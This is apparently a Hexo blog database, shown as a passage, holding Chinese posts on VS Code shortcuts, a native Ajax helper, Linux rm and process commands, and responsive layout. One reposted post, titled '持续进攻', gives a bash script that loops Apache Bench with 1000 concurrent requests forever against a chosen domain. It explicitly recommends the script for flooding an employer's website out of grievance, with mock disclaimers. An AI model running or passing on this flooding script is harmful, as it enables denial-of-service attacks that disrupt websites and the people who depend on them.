folding(代码折叠)</strong></p>\n<ul>\n<li>在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按<code>Ctrl+Shift+[</code>折叠代码-按<code>Ctrl+Shift+]</code>即可展开。折叠也可以用左边沟中的<code>+/-</code>图标来完成。按<code>Ctrl+Shift+Alt+[</code>或按<code>Ctrl+Shift+Alt+]</code>折叠所有部分。</li>\n<li>提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。</li>\n</ul>\n</li>\n<li><p><strong>Errors and Warnings(错误和警告)</strong></p>\n<ul>\n<li>在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下<code>F8</code>,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。</li>\n</ul>\n</li>\n<li><p><strong>Snippets(片段)</strong></p>\n<ul>\n<li>您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从<code>建议列表</code>和按<code>Tab</code>中选择<code>trycatch</code>来创建一个<code>try-&gt;catch块</code>。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。</li>\n</ul>\n</li>\n</ul>\n"},{"title":"原生Ajax请求","date":"2018-04-16T08:01:01.000Z","archives":"原生Ajax请求","_content":"# 原生Ajax请求\n````\n    function ajax(options) {\n      options = options || {};\n      options.type = (options.type || \"GET\").toUpperCase();\n      options.dataType = options.dataType || \"json\";\n      var params = formatParams(options.data);\n\n      //创建 - 非IE6 - 第一步\n      if (window.XMLHttpRequest) {\n        var xhr = new XMLHttpRequest();\n      } else { //IE6及其以下版本浏览器\n        var xhr = new ActiveXObject('Microsoft.XMLHTTP');\n      }\n\n      //接收 - 第三步\n      xhr.onreadystatechange = function () {\n        if (xhr.readyState == 4) {\n          var status = xhr.status;\n          if (status >= 200 && status < 300) {\n            options.success && options.success(xhr.responseText, xhr.responseXML);\n          } else {\n            options.fail && options.fail(status);\n          }\n        }\n      }\n\n      //连接 和 发送 - 第二步\n      if (options.type == \"GET\") {\n        xhr.open(\"GET\", options.url + \"?\" + params, true);\n        xhr.send(null);\n      } else if (options.type == \"POST\") {\n        xhr.open(\"POST\", options.url, true);\n        //设置表单提交时的内容类型\n        xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        xhr.send(params);\n      }\n    }\n    \n    //格式化参数\n    function formatParams(data) {\n      var arr = [];\n      for (var name in data) {\n        arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name]));\n      }\n      arr.push((\"v=\" + Math.random()).replace(\".\", \"\"));\n      // console.log(arr.join(\"&\"));\n      return arr.join(\"&\");\n    }\n````","source":"_posts/JS/原生Ajax请求.md","raw":"---\ntitle: 原生Ajax请求\ndate: 2018-04-16 16:01:01\ntags: 原生Ajax\narchives: 原生Ajax请求\ncategories: Ajax\n---\n# 原生Ajax请求\n````\n    function ajax(options) {\n      options = options || {};\n      options.type = (options.type || \"GET\").toUpperCase();\n      options.dataType = options.dataType || \"json\";\n      var params = formatParams(options.data);\n\n      //创建 - 非IE6 - 第一步\n      if (window.XMLHttpRequest) {\n        var xhr = new XMLHttpRequest();\n      } else { //IE6及其以下版本浏览器\n        var xhr = new ActiveXObject('Microsoft.XMLHTTP');\n      }\n\n      //接收 - 第三步\n      xhr.onreadystatechange = function () {\n        if (xhr.readyState == 4) {\n          var status = xhr.status;\n          if (status >= 200 && status < 300) {\n            options.success && options.success(xhr.responseText, xhr.responseXML);\n          } else {\n            options.fail && options.fail(status);\n          }\n        }\n      }\n\n      //连接 和 发送 - 第二步\n      if (options.type == \"GET\") {\n        xhr.open(\"GET\", options.url + \"?\" + params, true);\n        xhr.send(null);\n      } else if (options.type == \"POST\") {\n        xhr.open(\"POST\", options.url, true);\n        //设置表单提交时的内容类型\n        xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        xhr.send(params);\n      }\n    }\n    \n    //格式化参数\n    function formatParams(data) {\n      var arr = [];\n      for (var name in data) {\n        arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name]));\n      }\n      arr.push((\"v=\" + Math.random()).replace(\".\", \"\"));\n      // console.log(arr.join(\"&\"));\n      return arr.join(\"&\");\n    }\n````","slug":"JS/原生Ajax请求","published":1,"updated":"2018-05-05T02:36:05.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbc000xr8xj3byrlv39","content":"<h1 id=\"原生Ajax请求\"><a href=\"#原生Ajax请求\" class=\"headerlink\" title=\"原生Ajax请求\"></a>原生Ajax请求</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ajax(options) &#123;</span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\">  options.type = (options.type || &quot;GET&quot;).toUpperCase();</span><br><span class=\"line\">  options.dataType = options.dataType || &quot;json&quot;;</span><br><span class=\"line\">  var params = formatParams(options.data);</span><br><span class=\"line\"></span><br><span class=\"line\">  //创建 - 非IE6 - 第一步</span><br><span class=\"line\">  if (window.XMLHttpRequest) &#123;</span><br><span class=\"line\">    var xhr = new XMLHttpRequest();</span><br><span class=\"line\">  &#125; else &#123; //IE6及其以下版本浏览器</span><br><span class=\"line\">    var xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //接收 - 第三步</span><br><span class=\"line\">  xhr.onreadystatechange = function () &#123;</span><br><span class=\"line\">    if (xhr.readyState == 4) &#123;</span><br><span class=\"line\">      var status = xhr.status;</span><br><span class=\"line\">      if (status &gt;= 200 &amp;&amp; status &lt; 300) &#123;</span><br><span class=\"line\">        options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        options.fail &amp;&amp; options.fail(status);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //连接 和 发送 - 第二步</span><br><span class=\"line\">  if (options.type == &quot;GET&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true);</span><br><span class=\"line\">    xhr.send(null);</span><br><span class=\"line\">  &#125; else if (options.type == &quot;POST&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;POST&quot;, options.url, true);</span><br><span class=\"line\">    //设置表单提交时的内容类型</span><br><span class=\"line\">    xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class=\"line\">    xhr.send(params);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//格式化参数</span><br><span class=\"line\">function formatParams(data) &#123;</span><br><span class=\"line\">  var arr = [];</span><br><span class=\"line\">  for (var name in data) &#123;</span><br><span class=\"line\">    arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;, &quot;&quot;));</span><br><span class=\"line\">  // console.log(arr.join(&quot;&amp;&quot;));</span><br><span class=\"line\">  return arr.join(&quot;&amp;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"原生Ajax请求\"><a href=\"#原生Ajax请求\" class=\"headerlink\" title=\"原生Ajax请求\"></a>原生Ajax请求</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ajax(options) &#123;</span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\">  options.type = (options.type || &quot;GET&quot;).toUpperCase();</span><br><span class=\"line\">  options.dataType = options.dataType || &quot;json&quot;;</span><br><span class=\"line\">  var params = formatParams(options.data);</span><br><span class=\"line\"></span><br><span class=\"line\">  //创建 - 非IE6 - 第一步</span><br><span class=\"line\">  if (window.XMLHttpRequest) &#123;</span><br><span class=\"line\">    var xhr = new XMLHttpRequest();</span><br><span class=\"line\">  &#125; else &#123; //IE6及其以下版本浏览器</span><br><span class=\"line\">    var xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //接收 - 第三步</span><br><span class=\"line\">  xhr.onreadystatechange = function () &#123;</span><br><span class=\"line\">    if (xhr.readyState == 4) &#123;</span><br><span class=\"line\">      var status = xhr.status;</span><br><span class=\"line\">      if (status &gt;= 200 &amp;&amp; status &lt; 300) &#123;</span><br><span class=\"line\">        options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        options.fail &amp;&amp; options.fail(status);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //连接 和 发送 - 第二步</span><br><span class=\"line\">  if (options.type == &quot;GET&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true);</span><br><span class=\"line\">    xhr.send(null);</span><br><span class=\"line\">  &#125; else if (options.type == &quot;POST&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;POST&quot;, options.url, true);</span><br><span class=\"line\">    //设置表单提交时的内容类型</span><br><span class=\"line\">    xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class=\"line\">    xhr.send(params);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//格式化参数</span><br><span class=\"line\">function formatParams(data) &#123;</span><br><span class=\"line\">  var arr = [];</span><br><span class=\"line\">  for (var name in data) &#123;</span><br><span class=\"line\">    arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;, &quot;&quot;));</span><br><span class=\"line\">  // console.log(arr.join(&quot;&amp;&quot;));</span><br><span class=\"line\">  return arr.join(&quot;&amp;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Linux 删除文件夹和文件的命令","date":"2018-04-28T08:32:00.000Z","archives":"删除命令","_content":"# Linux 删除文件夹和文件的命令\n+ -r 就是向下递归，不管有多少级目录，一并删除\n+ -f 就是直接强行删除，不作任何提示的意思\n\n## 删除文件夹实例：\n    rm -rf /var/log/httpd/access\n\n将会删除`/var/log/httpd/access`目录以及其下所有文件、文件夹\n\n## 删除文件使用实例：\n\n    rm -f /var/log/httpd/access.log\n\n将会强制删除`/var/log/httpd/access.log`这个文件","source":"_posts/Linux/linux 删除.md","raw":"---\ntitle: Linux 删除文件夹和文件的命令\ndate: 2018-04-28 16:32:00\ntags: Linux 删除命令\narchives: 删除命令\ncategories: Linux\n---\n# Linux 删除文件夹和文件的命令\n+ -r 就是向下递归，不管有多少级目录，一并删除\n+ -f 就是直接强行删除，不作任何提示的意思\n\n## 删除文件夹实例：\n    rm -rf /var/log/httpd/access\n\n将会删除`/var/log/httpd/access`目录以及其下所有文件、文件夹\n\n## 删除文件使用实例：\n\n    rm -f /var/log/httpd/access.log\n\n将会强制删除`/var/log/httpd/access.log`这个文件","slug":"Linux/linux 删除","published":1,"updated":"2018-05-05T01:24:42.424Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbd000zr8xj2jmecqx7","content":"<h1 id=\"Linux-删除文件夹和文件的命令\"><a href=\"#Linux-删除文件夹和文件的命令\" class=\"headerlink\" title=\"Linux 删除文件夹和文件的命令\"></a>Linux 删除文件夹和文件的命令</h1><ul>\n<li>-r 就是向下递归，不管有多少级目录，一并删除</li>\n<li>-f 就是直接强行删除，不作任何提示的意思</li>\n</ul>\n<h2 id=\"删除文件夹实例：\"><a href=\"#删除文件夹实例：\" class=\"headerlink\" title=\"删除文件夹实例：\"></a>删除文件夹实例：</h2><pre><code>rm -rf /var/log/httpd/access\n</code></pre><p>将会删除<code>/var/log/httpd/access</code>目录以及其下所有文件、文件夹</p>\n<h2 id=\"删除文件使用实例：\"><a href=\"#删除文件使用实例：\" class=\"headerlink\" title=\"删除文件使用实例：\"></a>删除文件使用实例：</h2><pre><code>rm -f /var/log/httpd/access.log\n</code></pre><p>将会强制删除<code>/var/log/httpd/access.log</code>这个文件</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Linux-删除文件夹和文件的命令\"><a href=\"#Linux-删除文件夹和文件的命令\" class=\"headerlink\" title=\"Linux 删除文件夹和文件的命令\"></a>Linux 删除文件夹和文件的命令</h1><ul>\n<li>-r 就是向下递归，不管有多少级目录，一并删除</li>\n<li>-f 就是直接强行删除，不作任何提示的意思</li>\n</ul>\n<h2 id=\"删除文件夹实例：\"><a href=\"#删除文件夹实例：\" class=\"headerlink\" title=\"删除文件夹实例：\"></a>删除文件夹实例：</h2><pre><code>rm -rf /var/log/httpd/access\n</code></pre><p>将会删除<code>/var/log/httpd/access</code>目录以及其下所有文件、文件夹</p>\n<h2 id=\"删除文件使用实例：\"><a href=\"#删除文件使用实例：\" class=\"headerlink\" title=\"删除文件使用实例：\"></a>删除文件使用实例：</h2><pre><code>rm -f /var/log/httpd/access.log\n</code></pre><p>将会强制删除<code>/var/log/httpd/access.log</code>这个文件</p>\n"},{"title":"Linux-進程管理","date":"2018-05-05T08:00:24.000Z","archives":"Linux-進程管理","_content":"## Linux-進程管理\n> ps aux | grep [process]\n\n> kill [process ID]\n\n> pm2 status # 查看pm2狀態","source":"_posts/Linux/Linux-進程管理.md","raw":"---\ntitle: Linux-進程管理\ndate: 2018-05-05 16:00:24\ntags: Linux-process\narchives: Linux-進程管理\ncategories: Linux\n---\n## Linux-進程管理\n> ps aux | grep [process]\n\n> kill [process ID]\n\n> pm2 status # 查看pm2狀態","slug":"Linux/Linux-進程管理","published":1,"updated":"2018-05-05T09:35:34.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbf0013r8xjh1y16bei","content":"<h2 id=\"Linux-進程管理\"><a href=\"#Linux-進程管理\" class=\"headerlink\" title=\"Linux-進程管理\"></a>Linux-進程管理</h2><blockquote>\n<p>ps aux | grep [process]</p>\n<p>kill [process ID]</p>\n<p>pm2 status # 查看pm2狀態</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Linux-進程管理\"><a href=\"#Linux-進程管理\" class=\"headerlink\" title=\"Linux-進程管理\"></a>Linux-進程管理</h2><blockquote>\n<p>ps aux | grep [process]</p>\n<p>kill [process ID]</p>\n<p>pm2 status # 查看pm2狀態</p>\n</blockquote>\n"},{"title":"持续进攻","date":"2018-05-07T08:39:27.000Z","archives":null,"_content":"# [转][BOSS开源软件(一)：黑客帝国之持久进攻](https://user.qzone.qq.com/525150008)\n\n **使用说明：**\\\n（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\\n（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\\n（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\\n（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\\n（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\\n（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！\n\n代码：\\\n(1) 打开Linux终端或OSX终端，新建文件`h.sh` \\\n(2) 编辑文件`h.sh`，并保存。代码内容如下：\n````\n#!/bin/bash\n# 注释：下面变量DOMAIN可以修改成你需要的网站域名 \nDOMAIN=\"http://www.yourdomain.com/\"\nCOUNT=1000\nwhile true\ndo\n    ab -c $COUNT -n  $COUNT $DOMAIN\ndone\n````\n(3) 添加h.sh的执行权限，输入命令：`chmod +x h.sh`\\\n(4) 执行软件，输入命令：`./h.sh`\n\n### 注意事项：\n1. 如果系统提示找不到`ab`命令时，您需要自行安装`ApacheWeb`服务器。\n\n    （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd\n\n    （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd\n\n    （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可\n\n2. 您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。\n\n    例如：我们设置DOMAIN为百度，我们必需写成\n    `http://www.baidu.com/`(注意反斜杠)，而不能`www.baidu.com`或`http://www.baidu.com`\n\n3. 如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。\n\n### 总结：\n我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。\n\n但我们需要再次提示：\n  \n该软件属于中华人民共和国的法定危险品，请谨慎使用。","source":"_posts/Linux/持续进攻.md","raw":"---\ntitle: 持续进攻\ndate: 2018-05-07 16:39:27\ntags:\narchives:\ncategories:\n---\n# [转][BOSS开源软件(一)：黑客帝国之持久进攻](https://user.qzone.qq.com/525150008)\n\n **使用说明：**\\\n（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\\n（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\\n（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\\n（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\\n（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\\n（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！\n\n代码：\\\n(1) 打开Linux终端或OSX终端，新建文件`h.sh` \\\n(2) 编辑文件`h.sh`，并保存。代码内容如下：\n````\n#!/bin/bash\n# 注释：下面变量DOMAIN可以修改成你需要的网站域名 \nDOMAIN=\"http://www.yourdomain.com/\"\nCOUNT=1000\nwhile true\ndo\n    ab -c $COUNT -n  $COUNT $DOMAIN\ndone\n````\n(3) 添加h.sh的执行权限，输入命令：`chmod +x h.sh`\\\n(4) 执行软件，输入命令：`./h.sh`\n\n### 注意事项：\n1. 如果系统提示找不到`ab`命令时，您需要自行安装`ApacheWeb`服务器。\n\n    （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd\n\n    （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd\n\n    （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可\n\n2. 您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。\n\n    例如：我们设置DOMAIN为百度，我们必需写成\n    `http://www.baidu.com/`(注意反斜杠)，而不能`www.baidu.com`或`http://www.baidu.com`\n\n3. 如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。\n\n### 总结：\n我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。\n\n但我们需要再次提示：\n  \n该软件属于中华人民共和国的法定危险品，请谨慎使用。","slug":"Linux/持续进攻","published":1,"updated":"2018-05-07T08:52:26.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbi0015r8xjz9unsvxm","content":"<h1 id=\"转-BOSS开源软件-一-：黑客帝国之持久进攻\"><a href=\"#转-BOSS开源软件-一-：黑客帝国之持久进攻\" class=\"headerlink\" title=\"[转]BOSS开源软件(一)：黑客帝国之持久进攻\"></a>[转]<a href=\"https://user.qzone.qq.com/525150008\" target=\"_blank\" rel=\"noopener\">BOSS开源软件(一)：黑客帝国之持久进攻</a></h1><p> <strong>使用说明：</strong>\\<br>（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\<br>（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\<br>（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\<br>（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\<br>（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\<br>（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！</p>\n<p>代码：\\<br>(1) 打开Linux终端或OSX终端，新建文件<code>h.sh</code> \\<br>(2) 编辑文件<code>h.sh</code>，并保存。代码内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># 注释：下面变量DOMAIN可以修改成你需要的网站域名 </span><br><span class=\"line\">DOMAIN=&quot;http://www.yourdomain.com/&quot;</span><br><span class=\"line\">COUNT=1000</span><br><span class=\"line\">while true</span><br><span class=\"line\">do</span><br><span class=\"line\">    ab -c $COUNT -n  $COUNT $DOMAIN</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure></p>\n<p>(3) 添加h.sh的执行权限，输入命令：<code>chmod +x h.sh</code>\\<br>(4) 执行软件，输入命令：<code>./h.sh</code></p>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><ol>\n<li><p>如果系统提示找不到<code>ab</code>命令时，您需要自行安装<code>ApacheWeb</code>服务器。</p>\n<p> （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd</p>\n<p> （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd</p>\n<p> （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可</p>\n</li>\n<li><p>您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。</p>\n<p> 例如：我们设置DOMAIN为百度，我们必需写成<br> <code>http://www.baidu.com/</code>(注意反斜杠)，而不能<code>www.baidu.com</code>或<code>http://www.baidu.com</code></p>\n</li>\n<li><p>如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。</p>\n</li>\n</ol>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。</p>\n<p>但我们需要再次提示：</p>\n<p>该软件属于中华人民共和国的法定危险品，请谨慎使用。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"转-BOSS开源软件-一-：黑客帝国之持久进攻\"><a href=\"#转-BOSS开源软件-一-：黑客帝国之持久进攻\" class=\"headerlink\" title=\"[转]BOSS开源软件(一)：黑客帝国之持久进攻\"></a>[转]<a href=\"https://user.qzone.qq.com/525150008\" target=\"_blank\" rel=\"noopener\">BOSS开源软件(一)：黑客帝国之持久进攻</a></h1><p> <strong>使用说明：</strong>\\<br>（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\<br>（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\<br>（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\<br>（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\<br>（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\<br>（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！</p>\n<p>代码：\\<br>(1) 打开Linux终端或OSX终端，新建文件<code>h.sh</code> \\<br>(2) 编辑文件<code>h.sh</code>，并保存。代码内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># 注释：下面变量DOMAIN可以修改成你需要的网站域名 </span><br><span class=\"line\">DOMAIN=&quot;http://www.yourdomain.com/&quot;</span><br><span class=\"line\">COUNT=1000</span><br><span class=\"line\">while true</span><br><span class=\"line\">do</span><br><span class=\"line\">    ab -c $COUNT -n  $COUNT $DOMAIN</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure></p>\n<p>(3) 添加h.sh的执行权限，输入命令：<code>chmod +x h.sh</code>\\<br>(4) 执行软件，输入命令：<code>./h.sh</code></p>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><ol>\n<li><p>如果系统提示找不到<code>ab</code>命令时，您需要自行安装<code>ApacheWeb</code>服务器。</p>\n<p> （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd</p>\n<p> （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd</p>\n<p> （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可</p>\n</li>\n<li><p>您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。</p>\n<p> 例如：我们设置DOMAIN为百度，我们必需写成<br> <code>http://www.baidu.com/</code>(注意反斜杠)，而不能<code>www.baidu.com</code>或<code>http://www.baidu.com</code></p>\n</li>\n<li><p>如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。</p>\n</li>\n</ol>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。</p>\n<p>但我们需要再次提示：</p>\n<p>该软件属于中华人民共和国的法定危险品，请谨慎使用。</p>\n"},{"title":"响应式布局JS事件","date":"2018-04-19T01:23:15.000Z","archives":"样式表","_content":"为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize \n````\n// getSize(解决rem布局)\n(function(){\n\tgetSize();\n\twindow.addEventListener('resize',getSize);\n\t\n\tfunction getSize(){\n\t\tdocument.documentElement.style.fontSize \n\t\t= document.documentElement.clientWidth/3.75/2+'px';\n\t}\n})()\n````","source":"_posts/JS/响应式布局JS事件.md","raw":"---\ntitle: 响应式布局JS事件\ndate: 